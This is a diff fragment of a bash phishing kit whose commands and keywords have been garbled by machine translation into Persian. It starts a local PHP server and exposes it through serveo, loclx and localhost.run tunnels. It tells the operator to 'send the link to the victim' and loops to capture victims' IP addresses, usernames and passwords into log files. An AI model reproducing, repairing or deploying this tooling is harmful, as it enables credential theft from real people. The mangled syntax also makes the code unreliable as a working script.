+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m Initializing ... \ e [0m \ e [1؛ 91m (\ e [0m \ e [1؛ 96mhttp: //127.0.0.1: $ serveo_port \ e [0m \ e [1؛ 91m) \ e [0m \ n "
+خوابیدن 1
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m راه اندازی سرویس ... \ e [0 متر \ n "
+cd .htr/www && php -S 127.0.0.1:$serveo_port>/dev/null 2> & 1 & 
+اگر [[$ serveo_custom_subdomain == true]] ؛ سپس
+$ (که sh) -c 'ssh -o StrictHostKeyChecking = بدون -o ServerAliveInterval = 60 -o ServerAliveCountMax = 60 -R٪ s: 80: localhost:٪ s serveo.net> .nexlink 2> /dev /null &' $ serveo_subdomain ، $ serveo_port
+خوابیدن 7
+
+دیگری
+$ (که sh) -c 'ssh -o StrictHostKeyChecking = no -o ServerAliveInterval = 60 -R 80: localhost:٪ s serveo.net> .nexlink 2> /dev /null &' $ serveo_port
+خوابیدن 7
+fi
+serveo_link = $ (grep -o '. \ {0،0 \} http. \ {0،100 \}' .nexlink)
+بانوی کوچک
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m ارسال پیوند به قربانی: \ e [ 0m \ e [1؛ 93m٪٪ s \ n "$ serveo_link
+
+داده پیدا شده
+}
+
+start_loclx () {
+
+loclx_default_choose_sub = "Y"
+loclx_default_sub = "$ website $ RANDOM"
+
+printf "\ e [0m \ n"
+printf '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m ایجاد پیوند سفارشی؟ \ e [0m \ e [1؛ 91m [\ e [0m \ e [1؛ 92mY \ e [0m \ e [1؛ 91m/\ e [0m \ e [1؛ 92mn \ e [0m \ e [1 ؛ 91m]: \ e [0m \ e [1؛ 93m '
+loclx_choose_sub را بخوانید
+loclx_choose_sub = "$ {loclx_choose_sub:-$ {loclx_default_choose_sub}}"
+اگر [[$ loclx_choose_sub == "Y" || $ loclx_choose_sub == "y" || $ loclx_choose_sub == "بله" || $ loclx_choose_sub == "بله"]]؛ سپس
+loclx_custom_subdomain = true
+خوابیدن 1
+printf "\ e [0m \ n"
+printf '\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m Input CUSTOM Subdomain: \ e [0m \ e [1؛ 91m (\ e [0m \ e [1؛ 92m پیش فرض: \ e [0m \ e [1؛ 93m٪٪ s \ e [0m \ e [1؛ 91m) \ e [0m \ e [1؛ 92m : \ e [0m \ e [1؛ 93m '$ loclx_default_sub
+loclx_subdomain را بخوانید
+loclx_subdomain = "$ {loclx_subdomain:-$ {loclx_default_sub}}"
+خوابیدن 1
+fi
+
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m Initializing ... \ e [0m \ e [1؛ 91m (\ e [0m \ e [1؛ 96mhttp: //127.0.0.1: 4142 \ e [0m \ e [1؛ 91m) \ e [0m \ n "
+خوابیدن 1
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m راه اندازی LocalTunnel ... \ e [0m \ n "
+cd .htr/www && php -S 127.0.0.1:4142>/dev/null 2> & 1 & 
+اگر [[$ loclx_custom_subdomain == true]] ؛ سپس
+
+./.htr/loclx تونل http --to: 4142 --subdomain $ loclx_subdomain> .nexlink 2>/dev/null &
+
+خوابیدن 8
+
+دیگری
+./.htr/loclx تونل http --to: 4142> .nexlink 2>/dev/null &
+خوابیدن 8
+fi
+loclx_link = $ (grep -o 'https: // [0-9a-z]*\. loclx.io' .nexlink)
+بانوی کوچک
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m ارسال پیوند به قربانی: \ e [ 0m \ e [1؛ 93m٪٪ s \ n "$ loclx_link
+
+داده پیدا شده
+}
+
+start_localhostrun () {
+
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m راه اندازی LocalHostRun ... \ e [0 متر \ n "
+cd .htr/www && php -S 127.0.0.1:4545>/dev/null 2> & 1 & 
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m Initializing ... \ e [0m \ e [1؛ 91m (\ e [0m \ e [1؛ 96mhttp: //127.0.0.1: 4545 \ e [0m \ e [1؛ 91m) \ e [0m \ n "
+خوابیدن 1
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m Ctrl+C را برای مشاهده اعتبارهای ورود به سیستم فشار دهید \ e [0m \ n "
+خوابیدن 1
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m"
+ssh -R 80: localhost: 4545 ssh.localhost.run
+
+printf "\ e [0m \ n"
+
+printf "\ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m :: \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m اطلاعات ورود به سیستم \ e [1؛ 31m [\ e [0m \ e [1؛ 77m :: \ e [0m \ e [1؛ 31m] \ e [0m \ n "
+printf "\ e [0m \ n"
+در حالی که [درست] ؛ انجام دادن
+
+
+اگر [[-e ".htr/www/ip.txt"]] ؛ سپس
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m IP قربانی پیدا شد! \ e [0m \ n "
+grab_ip
+rm -rf .htr/www/ip.txt
+fi
+0.75 بخوابید
+اگر [[-e ".htr/www/usernames.txt"]] ؛ سپس
+حساب = $ (grep -o 'نام کاربری:.*' .htr/www/usernames.txt | cut -d "" -f2)
+IFS = $ '\ n'
+رمز عبور = $ (grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ حساب 92m: \ e [0m \ e [ 1 ؛ 96 میلیون٪ s \ n \ e [0 میلیون »$ حساب
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m رمز عبور: \ e [0m \ e [ 1 ؛ 96 میلیون٪ s \ n \ e [0 میلیون »$ رمز عبور
+cat .htr/www/usernames.txt >> logs/$ website.log
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m ذخیره شده: \ e [0m \ e [ 1 ؛ 93 میلیون گزارش/٪ s.log \ e [0m \ n "$ وب سایت
+printf "\ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m برای خروج از \ e [Ctrl + C را فشار دهید] 0 متر \ n "
+rm -rf .htr/www/usernames.txt
+fi
+0.75 بخوابید
+
+انجام شده
+
+}
+
+grab_ip () {
+
+ip = $ (grep -a 'IP:' .htr/www/ip.txt | cut -d "" -f2 | tr -d '\ r')
+IFS = $ '\ n'
+
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m IP قربانی: \ e [0m \ e [1؛ 96m٪٪ s \ e [0m \ n "$ ip
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m ذخیره شده: \ e [0m \ e [ 1 ؛ 93m ip.txt \ e [0m \ n "$ سرور
+printf "\ n"
+cat .htr/www/ip.txt >> ip.txt
+
+}
+
+grab_creds () {
+
+حساب = $ (grep -o 'نام کاربری:.*' .htr/www/usernames.txt | cut -d "" -f2)
+IFS = $ '\ n'
+رمز عبور = $ (grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ حساب 92m: \ e [0m \ e [ 1 ؛ 96 میلیون٪ s \ n \ e [0 میلیون »$ حساب
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m رمز عبور: \ e [0m \ e [ 1 ؛ 96 میلیون٪ s \ n \ e [0 میلیون »$ رمز عبور
+cat .htr/www/usernames.txt >> logs/$ website.log
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 96m ذخیره شده: \ e [0m \ e [ 1 ؛ 93 میلیون گزارش/٪ s.log \ e [0m \ n "$ وب سایت
+printf "\ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m در انتظار اطلاعات ورود به سیستم بعدی ، \ e [ 0m \ e [1؛ 96m Ctrl + C برای خروج. \ e [0m \ n "
+
+}
+
+datafound () {
+
+printf "\ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 93m در انتظار اطلاعات ورود به سیستم ، \ e [0m \ e [1؛ 96m Ctrl + C برای خروج. \ e [0m \ n "
+printf "\ n"
+در حالی که [درست] ؛ انجام دادن
+
+
+اگر [[-e ".htr/www/ip.txt"]] ؛ سپس
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m IP قربانی پیدا شد! \ e [0m \ n "
+grab_ip
+rm -rf .htr/www/ip.txt
+fi
+0.75 بخوابید
+اگر [[-e ".htr/www/usernames.txt"]] ؛ سپس
+printf "\ e [0m \ n"
+printf "\ e [1؛ 31m [\ e [0m \ e [1؛ 77m ~ \ e [0m \ e [1؛ 31m] \ e [0m \ e [1؛ 92m اطلاعات ورود به سیستم پیدا شد !! \ e [0m \ n "
+grab_creds
+rm -rf .htr/www/usernames.txt
+fi
+0.75 بخوابید
+
+
+انجام شده 
+
+}
+
+بنر
+نیازها
+منو
